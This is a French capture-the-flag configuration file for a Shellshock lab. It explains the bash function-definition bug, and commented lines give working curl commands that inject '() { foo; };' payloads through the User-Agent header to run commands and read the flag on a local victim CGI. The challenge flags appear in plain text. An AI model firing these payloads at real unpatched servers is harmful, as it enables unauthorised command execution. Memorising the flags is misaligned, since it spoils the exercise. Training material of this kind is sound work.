#
# CTF-shellshock
# 
# Configuration des challenges
#
# [XXX] Label du challenge, doit être unique, sans contrainte particulière
# name: Home Sweet Home : Nom du challenge tel qu'il apparait sur les pages HTLM
# value: 10 : Nombre de points marqués pour la résolution du challenge
# category: Ghost in the Shell : Catégorie regroupant plusieurs challenges
# flag: flag_{m0n_pr3m13r_fl4g}
# file: (optionnel) : le nom d'un fichier qui sera téléchargeable par les participants.
# description: peut tenir sur une ou plusieures lignes.
#   [espace !!] Les lignes de la description DOIVENT commencer par un ESPACE ou une TABULATION 
#   Utiliser le tag HTML </br> pour marquer un saut de ligne.


[Intro]
theme: Vuln
category: Shellshock
label: Shellshock
docker: ctf-shellshock
description: 
  ## Shellshock
  .
  Shellshock, aussi surnommé Bashdoor, est une famille de failles dans le shell /bin/bash.
  .
  <u<La faille</u>
  Le bug de bash est simple: quand une variable d'environnement contient une commande à la suite d'une définition de fonction, bash l'execute.
  Les serveurs web, passent les entêtes HTTP en variables d'environnement quand ils executent des scripts.
  En ajoutant des déclarations de fonction bash dans les entêtes HTTP, il est possible d'executer des commandes.
  Une fonction se déclare avec:
  ```
  () { foo; }
  ```
  .
  La première faille a été découverte en septembre 2014 par Stéphane Chazelas. Dans les jours qui suivent, toute une série de failles sont identifiées: CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187
  .
  Il n'a fallu que quelques heures après la publication de la faille pour que des botnets basés sur cette faille se mettent en place.
  .
  Le serveur web passe les entêtes HTTP en variables d'environnement bash.
  En ajoutant des déclarations de fonction bash dans les entêtes HTTP, il est possible d'executer des commandes.
  .
  Pour en savoir plus :   <a href='https://en.wikipedia.org/wiki/Shellshock_(software_bug)' target='_blank'>wikipedia</a>  
  
  
#
# $ curl -A "() { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id" http://localhost:5555/victim.cgi
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
#  curl -A "() { foo; }; echo;  /usr/bin/id" http://localhost:5555/victim.cgi
# $ curl -A "() { foo; }; echo;  /bin/cat flag.txt; " http://localhost:5555/victim.cgi
[shellshock]
name: Shellshock
value: 5
category: Shellshock
flag: flag_{active_l_autopatch} 
hint: curl -A "user-agent-yolo" http://XXX
description: 
  Démarrez le serveur en cliquant sur le boutton en haut de page.
  Le serveur web apache qui tourne en http://IPSERVER/victim.cgi est configuré pour executer des scripts bash.
  .
  Ouvrez votre xterm dans l'onglet [Mon terminal].
  Vérifiez que le serveur fonctionne.
  ```
  curl http://IPSERVER/victim.cgi
  ```
  Mettre comme valeur pour l'entête User-Agent
  ```
  () { foo; }; echo; /usr/bin/id
  ```
  La variable d'environnement $PATH n'est pas prise en compte. Lancez des commandes en entrant leur chemin complet.
  .
  Lister le contenu du répertoire, et affichez le flag.


